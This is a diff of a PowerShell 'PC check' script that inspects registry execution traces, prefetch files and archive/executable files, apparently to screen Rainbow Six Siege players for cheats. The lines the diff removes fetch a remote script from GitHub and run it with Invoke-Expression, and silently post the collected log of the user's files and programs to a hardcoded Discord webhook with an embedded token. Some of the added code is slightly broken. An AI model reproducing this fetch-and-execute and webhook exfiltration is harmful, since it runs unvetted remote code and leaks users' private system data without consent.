@@ -30,13 +30,15 @@ Check-SecureBoot
 
 function Get-OneDrivePath {
     try {
+        # Attempt to retrieve OneDrive path from registry
         $oneDrivePath = (Get-ItemProperty "HKCU:\Software\Microsoft\OneDrive" -Name "UserFolder").UserFolder
         if (-not $oneDrivePath) {
             Write-Warning "OneDrive path not found in registry. Attempting alternative detection..."
+            # Attempt to find OneDrive path using environment variables
             $envOneDrive = [System.IO.Path]::Combine($env:UserProfile, "OneDrive")
             if (Test-Path $envOneDrive) {
                 $oneDrivePath = $envOneDrive
-                Write-Host "[-] OneDrive path detected using environment variable: $oneDrivePath" -ForegroundColor Green
+                Write-Host "OneDrive path detected using environment variable: $oneDrivePath" -ForegroundColor Green
             } else {
                 Write-Error "Unable to find OneDrive path automatically."
             }
@@ -50,16 +52,13 @@ function Get-OneDrivePath {
 
 function Format-Output {
     param($name, $value)
-    $output = "{0} : {1}" -f $name, $value -replace 'System.Byte\[\]', ''
-    if ($output -notmatch "Steam|Origin|EAPlay|FileSyncConfig.exe|OutlookForWindows") {
-        return $output
-    }
+    "{0} : {1}" -f $name, $value -replace 'System.Byte\[\]', ''
 }
 
 function Log-FolderNames {
     $userName = $env:UserName
     $oneDrivePath = Get-OneDrivePath
-    $potentialPaths = @("C:\Users\$userName\Documents\My Games\Rainbow Six - Siege", "$oneDrivePath\Documents\My Games\Rainbow Six - Siege")
+    $potentialPaths = @("C:\Users\$userName\Documents\My Games\Rainbow Six - Siege","$oneDrivePath\Documents\My Games\Rainbow Six - Siege")
     $allUserNames = @()
 
     foreach ($path in $potentialPaths) {
@@ -69,270 +68,256 @@ function Log-FolderNames {
         }
     }
 
+    # Remove duplicates if the same username is found in both paths
     $uniqueUserNames = $allUserNames | Select-Object -Unique
 
     if ($uniqueUserNames.Count -eq 0) {
-        Write-Host "`nSkipping Stats.cc Search" -ForegroundColor Yellow
+        Write-Output "R6 directory not found."
     } else {
-        Write-Host "`nR6 Usernames Detected. Summon Stats.cc? | (Y/N)"
-        $userResponse = Read-Host
-
-        if ($userResponse -eq "Y") {
-            foreach ($name in $uniqueUserNames) {
-                $url = "https://stats.cc/siege/$name"
-                Write-Host " [-] Opening stats for $name on Stats.cc ..." -ForegroundColor DarkMagenta
-                Start-Process $url
-                Start-Sleep -Seconds 0.5
-            }
-        } else {
-            Write-Host "Stats.cc Search Skipped" -ForegroundColor Yellow
-        }
+        return $uniqueUserNames
     }
 }
 
+function Find-RarAndExeFiles {
+    Write-Output "Finding .rar and .exe files..."
+    $desktopPath = [System.Environment]::GetFolderPath('Desktop')
+    $outputFile = Join-Path -Path $desktopPath -ChildPath "PcCheckLogs.txt"
+    $oneDriveFileHeader = "`n-----------------`nOneDrive Files:`n"
+    $oneDriveFiles = @()
+
+    $rarSearchPaths = @()
+    Get-PSDrive -PSProvider 'FileSystem' | ForEach-Object { $rarSearchPaths += $_.Root }
+    $oneDrivePath = Get-OneDrivePath
+    if ($oneDrivePath) { $rarSearchPaths += $oneDrivePath }
+
+    # Prepare script blocks for concurrent execution
+    $jobs = @()
+
+    # Define script block for finding .rar files
+    $rarJob = {
+        param ($searchPaths, $outputFile, $oneDriveFiles)
+        $allFiles = @()
+        foreach ($path in $searchPaths) {
+            Get-ChildItem -Path $path -Recurse -Filter "*.rar" -ErrorAction SilentlyContinue | ForEach-Object {
+                $allFiles += $_.FullName
+                if ($_.FullName -like "*OneDrive*") { $oneDriveFiles += $_.FullName }
+            }
+        }
+        return $allFiles
+    }
+
+    # Define script block for finding .exe files
+    $exeJob = {
+        param ($oneDrivePath, $outputFile, $oneDriveFiles)
+        $exeFiles = @()
+        if ($oneDrivePath) {
+            Get-ChildItem -Path $oneDrivePath -Recurse -Filter "*.exe" -ErrorAction SilentlyContinue | ForEach-Object {
+                $exeFiles += $_.FullName
+                if ($_.FullName -like "*OneDrive*") { $oneDriveFiles += $_.FullName }
+            }
+        }
+        return $exeFiles
+    }
+
+    # Start jobs
+    $jobs += Start-Job -ScriptBlock $rarJob -ArgumentList $rarSearchPaths, $outputFile, $oneDriveFiles
+    $jobs += Start-Job -ScriptBlock $exeJob -ArgumentList $oneDrivePath, $outputFile, $oneDriveFiles
+
+    # Wait for all jobs to complete and receive their output
+    $jobs | ForEach-Object {
+        Wait-Job $_ | Out-Null  # Suppress job completion output
+        $allFiles += Receive-Job $_  # Receive job output
+        Remove-Job $_  # Clean up job
+    }
+
+    $groupedFiles = $allFiles | Sort-Object
+
+    if ($oneDriveFiles.Count -gt 0) {
+        Add-Content -Path $outputFile -Value $oneDriveFileHeader
+        $oneDriveFiles | Sort-Object | ForEach-Object { Add-Content -Path $outputFile -Value $_ }
+    }
+
+    if ($groupedFiles.Count -gt 0) {
+        $groupedFiles | ForEach-Object { Add-Content -Path $outputFile -Value $_ }
+    }
+}
 
 function Find-SusFiles {
-    Write-Host " [-] Finding suspicious files names..." -ForegroundColor DarkMagenta
+    Write-Output "Finding suspicious files names..."
+    $desktopPath = [System.Environment]::GetFolderPath('Desktop')
+    $outputFile = Join-Path -Path $desktopPath -ChildPath "PcCheckLogs.txt"
+    $susFilesHeader = "`n-----------------`nSus Files:`n"
     $susFiles = @()
 
-    foreach ($file in $global:logEntries) {
-        if ($file -match "loader.*\.exe") { $susFiles += $file }
-    }
-
-    if ($susFiles.Count -gt 0) {
-        $global:logEntries += "`n-----------------`nSus Files(Files with loader in their name):`n"
-        $global:logEntries += $susFiles | Sort-Object
-    }
-}
-
-function Find-ZipRarFiles {
-    Write-Host " [-] Finding .zip and .rar files. Please wait..." -ForegroundColor DarkMagenta
-    $zipRarFiles = @()
-    $searchPaths = @($env:UserProfile, "$env:UserProfile\Downloads")
-    $uniquePaths = @{}
-
-    foreach ($path in $searchPaths) {
-        if (Test-Path $path) {
-            $files = Get-ChildItem -Path $path -Recurse -Include *.zip, *.rar -File
-            foreach ($file in $files) {
-                if (-not $uniquePaths.ContainsKey($file.FullName) -and $file.FullName -notmatch "minecraft") {
-                    $uniquePaths[$file.FullName] = $true
-                    $zipRarFiles += $file
-                }
-            }
+    if (Test-Path $outputFile) {
+        $loggedFiles = Get-Content -Path $outputFile
+        foreach ($file in $loggedFiles) {
+            if ($file -match "loader.*\.exe") { $susFiles += $file }
         }
+
+        if ($susFiles.Count -gt 0) {
+            Add-Content -Path $outputFile -Value $susFilesHeader
+            $susFiles | Sort-Object | ForEach-Object { Add-Content -Path $outputFile -Value $_ }
+        }
+    } else {
+        Write-Output "Log file not found. Unable to search for suspicious files."
     }
-
-    return $zipRarFiles
 }
+
 function List-BAMStateUserSettings {
-    Write-Host " `n [-] Fetching" -ForegroundColor DarkMagenta -NoNewline; Write-Host " UserSettings" -ForegroundColor White -NoNewline; Write-Host " Entries " -ForegroundColor DarkMagenta
-
+    Write-Host "Logging reg entries inside PowerShell..." -ForegroundColor DarkMagent
+    $desktopPath = [System.Environment]::GetFolderPath('Desktop')
+    $outputFile = Join-Path -Path $desktopPath -ChildPath "PcCheckLogs.txt"
+    if (Test-Path $outputFile) { Clear-Content $outputFile }
     $loggedPaths = @{}
-
+     Write-Host " Fetching UserSettings Entries " -ForegroundColor DarkMagenta
+    # Log entries from bam\State\UserSettings
     $registryPath = "HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings"
     $userSettings = Get-ChildItem -Path $registryPath | Where-Object { $_.Name -like "*1001" }
 
     if ($userSettings) {
         foreach ($setting in $userSettings) {
-            $global:logEntries += "`n$($setting.PSPath)"
+            Add-Content -Path $outputFile -Value "`n$($setting.PSPath)"
             $items = Get-ItemProperty -Path $setting.PSPath | Select-Object -Property *
             foreach ($item in $items.PSObject.Properties) {
-                if (($item.Name -match "exe" -or $item.Name -match ".rar") -and -not $loggedPaths.ContainsKey($item.Name) -and $item.Name -notmatch "FileSyncConfig.exe|OutlookForWindows") {
-                    $global:logEntries += "`n" + (Format-Output $item.Name $item.Value)
+                if (($item.Name -match "exe" -or $item.Name -match ".rar") -and -not $loggedPaths.ContainsKey($item.Name)) {
+                    Add-Content -Path $outputFile -Value (Format-Output $item.Name $item.Value)
                     $loggedPaths[$item.Name] = $true
                 }
             }
         }
     } else {
-        Write-Host " [-] No relevant user settings found." -ForegroundColor Red
+        Write-Host "No relevant user settings found." -ForegroundColor DarkMagenta
     }
-
-    Write-Host " [-] Fetching" -ForegroundColor DarkMagenta -NoNewline; Write-Host " Compatibility Assistant" -ForegroundColor White -NoNewline; Write-Host " Entries" -ForegroundColor DarkMagenta
+Write-Host "Fetching Compatibility Assistant Entries"
+    # Log entries from Compatibility Assistant Store
     $compatRegistryPath = "HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store"
     $compatEntries = Get-ItemProperty -Path $compatRegistryPath
     $compatEntries.PSObject.Properties | ForEach-Object {
-        if (($_.Name -match "exe" -or $_.Name -match ".rar") -and -not $loggedPaths.ContainsKey($_.Name) -and $_.Name -notmatch "FileSyncConfig.exe|OutlookForWindows") {
-            $global:logEntries += "`n" + (Format-Output $_.Name $_.Value)
+        if (($_.Name -match "exe" -or $_.Name -match ".rar") -and -not $loggedPaths.ContainsKey($_.Name)) {
+            Add-Content -Path $outputFile -Value (Format-Output $_.Name $_.Value)
             $loggedPaths[$_.Name] = $true
         }
     }
-
-    Write-Host " [-] Fetching" -ForegroundColor DarkMagenta -NoNewline; Write-Host " AppsSwitched" -ForegroundColor White -NoNewline; Write-Host " Entries" -ForegroundColor DarkMagenta
+Write-Host "Fetching AppsSwitched Entries" -ForegroundColor Cyan
+    # Log entries from FeatureUsage\AppSwitched
     $newRegistryPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppSwitched"
     if (Test-Path $newRegistryPath) {
         $newEntries = Get-ItemProperty -Path $newRegistryPath
         $newEntries.PSObject.Properties | ForEach-Object {
-            if (($_.Name -match "exe" -or $_.Name -match ".rar") -and -not $loggedPaths.ContainsKey($_.Name) -and $_.Name -notmatch "FileSyncConfig.exe|OutlookForWindows") {
-                $global:logEntries += "`n" + (Format-Output $_.Name $_.Value)
+            if (($_.Name -match "exe" -or $_.Name -match ".rar") -and -not $loggedPaths.ContainsKey($_.Name)) {
+                Add-Content -Path $outputFile -Value (Format-Output $_.Name $_.Value)
                 $loggedPaths[$_.Name] = $true
             }
         }
     }
-
-    Write-Host " [-] Fetching" -ForegroundColor DarkMagenta -NoNewline; Write-Host " MuiCache" -ForegroundColor White -NoNewline; Write-Host " Entries" -ForegroundColor DarkMagenta
-    $muiCachePath = "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
+Write-Host "Fetching MuiCache Entries" -ForegroundColor Cyan
+    # Log entries from MuiCachea
+    $muiCachePath = "HKCR:\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
     if (Test-Path $muiCachePath) {
         $muiCacheEntries = Get-ChildItem -Path $muiCachePath
         $muiCacheEntries.PSObject.Properties | ForEach-Object {
-            if (($_.Name -match "exe" -or $_.Name -match ".rar") -and -not $loggedPaths.ContainsKey($_.Name) -and $_.Name -notmatch "FileSyncConfig.exe|OutlookForWindows") {
-                $global:logEntries += "`n" + (Format-Output $_.Name $_.Value)
+            if (($_.Name -match "exe" -or $_.Name -match ".rar") -and -not $loggedPaths.ContainsKey($_.Name)) {
+                Add-Content -Path $outputFile -Value (Format-Output $_.Name $_.Value)
                 $loggedPaths[$_.Name] = $true
             }
         }
     }
 
-    $global:logEntries = $global:logEntries | Sort-Object | Get-Unique | Where-Object { $_ -notmatch "\{.*\}" } | ForEach-Object { $_ -replace ":", "" }
+    Get-Content $outputFile | Sort-Object | Get-Unique | Where-Object { $_ -notmatch "\{.*\}" } | ForEach-Object { $_ -replace ":", "" } | Set-Content $outputFile
 
     Log-BrowserFolders
-
+    # Remove the placeholder Log-MUICacheEntries function call if not defined elsewhere
+  
     $folderNames = Log-FolderNames | Sort-Object | Get-Unique
-    $global:logEntries += "`n==============="
-    $global:logEntries += "`nR6 Usernames:"
+    Add-Content -Path $outputFile -Value "`n-----------------"
+    Add-Content -Path $outputFile -Value "`nR6 Usernames:"
 
     foreach ($name in $folderNames) {
-        $global:logEntries += "`n" + $name
+        Add-Content -Path $outputFile -Value $name
         $url = "https://stats.cc/siege/$name"
-        Write-Host " [-] Opening stats for $name on Stats.cc ..." -ForegroundColor DarkMagenta
+        Write-Host "Opening stats for $name on Stats.cc ..." -ForegroundColor Cyan
         Start-Process $url
         Start-Sleep -Seconds 0.5
     }
 }
-
+Write-Host " Fetching Downloaded Browsers " -ForegroundColor Darkred
 function Log-BrowserFolders {
-    Write-Host " [-] Fetching" -ForegroundColor DarkMagenta -NoNewline; Write-Host " reg entries" -ForegroundColor White -NoNewline; Write-Host " inside PowerShell..." -ForegroundColor DarkMagenta
+    Write-Host "Logging reg entries inside PowerShell..." -ForegroundColor DarkMagenta
     $registryPath = "HKLM:\SOFTWARE\Clients\StartMenuInternet"
-
+    $desktopPath = [System.Environment]::GetFolderPath('Desktop')
+    $outputFile = Join-Path -Path $desktopPath -ChildPath "PcCheckLogs.txt"
     if (Test-Path $registryPath) {
         $browserFolders = Get-ChildItem -Path $registryPath
-        $global:logEntries += "`n==============="
-        $global:logEntries += "`nBrowser Folders:"
-        foreach ($folder in $browserFolders) { $global:logEntries += "`n" + $folder.Name }
+        Add-Content -Path $outputFile -Value "`n-----------------"
+        Add-Content -Path $outputFile -Value "`nBrowser Folders:"
+        foreach ($folder in $browserFolders) { Add-Content -Path $outputFile -Value $folder.Name }
     } else {
-        Write-Host "Registry path for browsers not found." -ForegroundColor Red
+        Write-Host "Registry path for browsers not found." -ForegroundColor DarkMagenta
     }
 }
 
 function Log-WindowsInstallDate {
-    Write-Host " [-] Logging" -ForegroundColor DarkMagenta -NoNewline; Write-Host " Windows install" -ForegroundColor White -NoNewline; Write-Host " date..." -ForegroundColor DarkMagenta
+    Write-Host "Logging Windows install date..." -ForegroundColor DarkMagenta
     $os = Get-WmiObject -Class Win32_OperatingSystem
     $installDate = $os.ConvertToDateTime($os.InstallDate)
-    $global:logEntries += "`n==============="
-    $global:logEntries += "`nWindows Installation Date: $installDate"
-}
-
-function Check-RecentDocsForTlscan {
-    Write-Host " [-] Checking" -ForegroundColor DarkMagenta -NoNewline; Write-Host " for .tlscan" -ForegroundColor White -NoNewline; Write-Host " folders..." -ForegroundColor DarkMagenta
-    $recentDocsPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs"
-    $tlscanFound = $false
-    if (Test-Path $recentDocsPath) {
-        $recentDocs = Get-ChildItem -Path $recentDocsPath
-        foreach ($item in $recentDocs) {
-            if ($item.PSChildName -match "\.tlscan") {
-                $tlscanFound = $true
-                $folderPath = Get-ItemProperty -Path "$recentDocsPath\$($item.PSChildName)" -Name MRUListEx
-                $global:logEntries += "`n.tlscan FOUND. DMA SETUP SOFTWARE DETECTED in $folderPath"
-                Write-Host ".tlscan FOUND. DMA SETUP SOFTWARE DETECTED in $folderPath" -ForegroundColor Red
-            }
-        }
-    }
-    if (-not $tlscanFound) {
-        Write-Host " [-] No .tlscan ext found." -ForegroundColor Green
-    }
-}
-
-function Log-PrefetchFiles {
-    Write-Host " [-] Fetching Last Ran Dates..." -ForegroundColor DarkMagenta
-    $prefetchPath = "C:\Windows\Prefetch"
-    $pfFilesHeader = "`n=======================`n.pf files:`n"
-
-    if (Test-Path $prefetchPath) {
-        $pfFiles = Get-ChildItem -Path $prefetchPath -Filter *.pf -File
-        if ($pfFiles.Count -gt 0) {
-            $global:logEntries += $pfFilesHeader
-            $pfFiles | ForEach-Object {
-                $logEntry = "{0} | {1}" -f $_.Name, $_.LastWriteTime
-                $global:logEntries += "`n" + $logEntry
-            }
-        } else {
-            Write-Host "No .pf files found in the Prefetch folder." -ForegroundColor Green
-        }
-    } else {
-        Write-Host "Prefetch folder not found." -ForegroundColor Red
-    }
-}
-function Send-Logs {
     $desktopPath = [System.Environment]::GetFolderPath('Desktop')
-    $logFilePath = Join-Path -Path $desktopPath -ChildPath "PcCheckLogs.txt"
+    $outputFile = Join-Path -Path $desktopPath -ChildPath "PcCheckLogs.txt"
+    Add-Content -Path $outputFile -Value "`n-----------------"
+    Add-Content -Path $outputFile -Value "`nWindows Installation Date: $installDate"
+}
 
-    if (Test-Path $logFilePath) {
-        # Replace with your Discord webhook URL
-        $webhookUrl = "https://discord.com/api/webhooks/1340884378133331988/NDTOYzDlMA40wtX_MGMsTw0Jr2ahiuXOfPQi5ZPfAt978das6RfxTQv4kjHDFc3s7p4k"
+List-BAMStateUserSettings
+Log-WindowsInstallDate
+Find-RarAndExeFiles
+Find-SusFiles
 
-        # Read the log file content
-        $fileContent = Get-Content -Path $logFilePath -Raw
+$desktopPath = [System.Environment]::GetFolderPath('Desktop')
+# Copy the log file to clipboard
+$logFilePath = Join-Path -Path $desktopPath -ChildPath "PcCheckLogs.txt"
 
-        # Create the JSON payload
-        $payload = @{
-            content = "```\n$fileContent\n```"  # Sends the log content in a code block
-        } | ConvertTo-Json
+if (Test-Path $logFilePath) {
+    Set-Clipboard -Path $logFilePath
+    Write-Host "Log file copied to clipboard." -ForegroundColor Cyan
+} else {
+    Write-Host "Log file not found on the desktop." -ForegroundColor Cyan
+}
+# Paths to Desktop and Downloads folders
+$desktopPath = [System.Environment]::GetFolderPath('Desktop')
 
-        try {
-            # Send the POST request to the Discord webhook
-            Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload
-            Write-Host "Log sent successfully."
-        }
-        catch {
-            Write-Host "Failed to send log: $_" -ForegroundColor Red
-        }
-    }
-    else {
-        Write-Host "Log file not found." -ForegroundColor Red
+# Get the user's profile folder
+$userProfile = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
+
+# Construct the path to the Downloads folder
+$downloadsPath = Join-Path -Path $userProfile -ChildPath "Downloads"
+
+# Function to delete a file if it exists
+function Delete-FileIfExists {
+    param (
+        [string]$filePath
+    )
+    if (Test-Path $filePath) {
+        Remove-Item -Path $filePath -Force -ErrorAction SilentlyContinue
     }
 }
-function Main {
-    $global:logEntries = @()
-    $desktopPath = [System.Environment]::GetFolderPath('Desktop')
-    $logFilePath = Join-Path -Path $desktopPath -ChildPath "PcCheckLogs.txt"
 
+# Full paths to the target file in Desktop and Downloads folders
+$targetFileDesktop = Join-Path -Path $desktopPath -ChildPath "PcCheck.txt"
+$targetFileDownloads = Join-Path -Path $downloadsPath -ChildPath "PcCheck.txt"
 
+# Delete the target file if it exists
+Delete-FileIfExists -filePath $targetFileDesktop
+# Define colors
+$magenta = "Magenta"
+$red = "Red"
+$space = " " * 12  # Increased the number of spaces for more right alignment
 
-    List-BAMStateUserSettings
-    Log-WindowsInstallDate
-    Find-SusFiles
-    Check-RecentDocsForTlscan
-    Log-PrefetchFiles
+# Print the red "SCAN COMPLETE" line with more white space to the right
+Write-Host "`n$space╭─────────────────────────────────────╮" -ForegroundColor $red
+Write-Host "$space│            SCAN COMPLETE            │" -ForegroundColor $red
+Write-Host "$space╰─────────────────────────────────────╯" -ForegroundColor $red
 
-    $zipRarFiles = Find-ZipRarFiles
-    if ($zipRarFiles.Count -gt 0) {
-        $global:logEntries += "`n-----------------"
-        $global:logEntries += "`nFound .zip and .rar files:"
-        $zipRarFiles | ForEach-Object { $global:logEntries += "`n" + $_.FullName }
-    }
-
-    $global:logEntries | Out-File -FilePath $logFilePath -Encoding UTF8 -NoNewline
-    Start-Sleep -Seconds 1
-
-
-
-    if (Test-Path $logFilePath) {
-        Set-Clipboard -Path $logFilePath
-        Write-Host "Log file copied to clipboard." -ForegroundColor DarkRed
-    } else {
-        Write-Host "Log file not found on the desktop." -ForegroundColor Red
-    }
-
-    $userProfile = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
-    $downloadsPath = Join-Path -Path $userProfile -ChildPath "Downloads"
-    $url = "https://raw.githubusercontent.com/suprsor/Credits/refs/heads/main/Credits"
-    $content = Invoke-RestMethod -Uri $url
-    Invoke-Expression $content
-    Send-Logs
-
-
-
-
-
-}
-Main
-message.txt
+# Print the magenta border and text
+Write-Host "$space╭─────────────────────────────────────╮" -ForegroundColor $magenta
+Write-Host "$space│          Discord @suprsors        │" -ForegroundColor $magenta
+Write-Host "$space╰─────────────────────────────────────╯" -ForegroundColor $magenta
